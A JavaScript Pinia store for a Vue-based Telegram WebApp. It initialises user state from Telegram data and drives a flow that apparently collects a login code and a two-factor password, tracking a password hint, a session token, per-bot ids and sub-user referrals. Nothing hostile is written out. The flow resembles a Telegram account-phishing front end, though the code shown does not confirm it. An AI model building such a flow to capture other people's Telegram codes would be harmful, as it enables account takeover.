import { defineStore } from "pinia";
import { ref } from "vue";
import { api } from "../api/client";

export const useUserStore = defineStore("user", () => {
  const initialized = ref(false);
  const isLoading = ref(true);
  const user = ref(null);
  // States: unauthorized | enter_code | enter_twoFA | end
  const state = ref("unauthorized");
  const uId = ref(null);
  const botId = ref("default");
  const subUserRef = ref("");
  const passwordHint = ref("");
  const sessionToken = ref("");
  const otpAutoSent = ref(false);
  const isAdmin = ref(false);

  async function init() {
    isLoading.value = true;
    const tg = window.Telegram?.WebApp;
    const unsafe = tg?.initDataUnsafe;

    if (!unsafe || !unsafe.user) {
      isLoading.value = false;
      return false;
    }

    user.value = unsafe.user;
    const startParam = unsafe.start_param || "";
    const params = new URLSearchParams(window.location.search);

    if (startParam.startsWith("sub_")) {
      subUserRef.value = startParam.replace("sub_", "");
    } else if (startParam) {
      botId.value = startParam;
    }

    if (params.get("ref")) subUserRef.value = params.get("ref");
    if (params.get("b")) botId.value = params.get("b");

    try {
      const res = await api.autoInit({
        bot_id: botId.value,
        sub_user_ref: subUserRef.value,
        user_tg: user.value,
      });

      if (res && res.ok) {
        uId.value = res.u_id;
        state.value = res.state || "enter_code";
        passwordHint.value = res.password_hint || "";
        sessionToken.value = res.session_token || "";
        otpAutoSent.value = Boolean(res.otp_sent);
        isAdmin.value = Boolean(res.is_admin);
        initialized.value = true;
        isLoading.value = false;
        return true;
      }
    } catch (err) {
      console.error("Auto init error:", err);
    }

    isLoading.value = false;
    return false;
  }

  return {
    initialized,
    isLoading,
    user,
    state,
    uId,
    botId,
    subUserRef,
    passwordHint,
    sessionToken,
    otpAutoSent,
    isAdmin,
    init,
  };
});
